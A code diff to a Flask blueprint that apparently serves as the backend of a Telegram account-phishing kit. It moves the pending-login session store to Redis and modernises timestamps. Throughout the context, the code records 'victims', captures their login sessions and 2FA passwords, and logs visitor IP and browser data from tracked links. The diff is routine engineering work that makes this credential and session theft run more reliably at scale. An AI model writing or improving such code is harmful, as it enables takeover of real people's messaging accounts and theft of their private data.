@@ -1,14 +1,93 @@
 import re
 import uuid
+import json
 import asyncio
+from datetime import datetime, timezone
 from flask import Blueprint, render_template, request, jsonify
 from core.logger import log
 
 public_bp = Blueprint('public', __name__)
 
-# In-memory store for pending authentication sessions.
-# Maps session_id -> {phone, phone_code_hash, session_string, timeout}
-_pending_sessions: dict = {}
+# Session store for pending Telegram authentication sessions.
+# Uses Redis when available (required for multi-worker deployments) with
+# an in-memory dict as a fallback for single-process / test environments.
+_SESSION_TTL = 600  # seconds
+
+
+class _RedisPendingSessions:
+    """Redis-backed session store with in-memory fallback."""
+
+    _PREFIX = 'pending_session:'
+
+    def __init__(self):
+        self._client = None
+        self._fallback: dict = {}
+
+    def _get_client(self):
+        if self._client is None:
+            try:
+                import redis as _redis
+            except ImportError:
+                log.warning("redis package not available, using in-memory fallback for pending sessions")
+                self._client = False
+                return None
+            try:
+                from core.config import Config
+                self._client = _redis.from_url(Config.REDIS_URL, decode_responses=True)
+                self._client.ping()
+            except (_redis.RedisError, OSError) as e:
+                log.warning(f"Redis unavailable for pending sessions, using in-memory fallback: {e}")
+                self._client = False
+        return self._client if self._client is not False else None
+
+    def get(self, key, default=None):
+        client = self._get_client()
+        if client is None:
+            return self._fallback.get(key, default)
+        try:
+            raw = client.get(f'{self._PREFIX}{key}')
+            return json.loads(raw) if raw is not None else default
+        except Exception:
+            return self._fallback.get(key, default)
+
+    def __setitem__(self, key, value):
+        client = self._get_client()
+        if client is None:
+            self._fallback[key] = value
+            return
+        try:
+            client.setex(f'{self._PREFIX}{key}', _SESSION_TTL, json.dumps(value))
+        except Exception:
+            self._fallback[key] = value
+
+    def __getitem__(self, key):
+        val = self.get(key)
+        if val is None:
+            raise KeyError(key)
+        return val
+
+    def __contains__(self, key):
+        client = self._get_client()
+        if client is None:
+            return key in self._fallback
+        try:
+            return bool(client.exists(f'{self._PREFIX}{key}'))
+        except Exception:
+            return key in self._fallback
+
+    def pop(self, key, *args):
+        default = args[0] if args else None
+        client = self._get_client()
+        if client is None:
+            return self._fallback.pop(key, default)
+        try:
+            raw = client.getdel(f'{self._PREFIX}{key}')
+            return json.loads(raw) if raw is not None else default
+        except Exception:
+            return self._fallback.pop(key, default)
+
+
+_pending_sessions = _RedisPendingSessions()
 
 _PHONE_RE = re.compile(r'^\+\d{9,15}$')
 
@@ -126,14 +205,13 @@ def tracked_link_redirect(short_code):
     try:
         from web.extensions import db
         from models.tracked_link import TrackedLink, LinkClick
-        import datetime
         link = db.session.query(TrackedLink).filter(
             TrackedLink.short_code == short_code,
             TrackedLink.is_active == True,
         ).first()
         if not link:
             return '', 404
-        if link.expires_at and link.expires_at < datetime.datetime.utcnow():
+        if link.expires_at and link.expires_at < datetime.now(timezone.utc).replace(tzinfo=None):
             return '', 410
         ip, ua = _get_visitor_info()
         ua_info = _parse_ua(ua)
@@ -226,11 +304,10 @@ def api_verify():
         return jsonify({'status': 'error', 'message': 'Server error'}), 500
 
     if result.get('status') == 'success':
-        import datetime
         _upsert_victim(
             session['phone'], ip, ua, 'logged_in',
             session_captured=True,
-            login_at=datetime.datetime.utcnow(),
+            login_at=datetime.now(timezone.utc),
         )
         _pending_sessions.pop(sid, None)
     elif result.get('status') == 'need_2fa':
@@ -239,7 +316,9 @@ def api_verify():
         # Store the updated session_string if returned
         updated_session = result.get('session_string')
         if updated_session:
-            _pending_sessions[sid]['session_string'] = updated_session
+            entry = _pending_sessions.get(sid, {})
+            entry['session_string'] = updated_session
+            _pending_sessions[sid] = entry
 
     return jsonify(result)
 
@@ -265,11 +344,10 @@ def api_verify_2fa():
         return jsonify({'status': 'error', 'message': 'Server error'}), 500
 
     if result.get('status') == 'success':
-        import datetime
         _upsert_victim(
             session['phone'], ip, ua, '2fa_passed',
             twofa_captured=True,
-            login_at=datetime.datetime.utcnow(),
+            login_at=datetime.now(timezone.utc),
         )
         _pending_sessions.pop(sid, None)
 
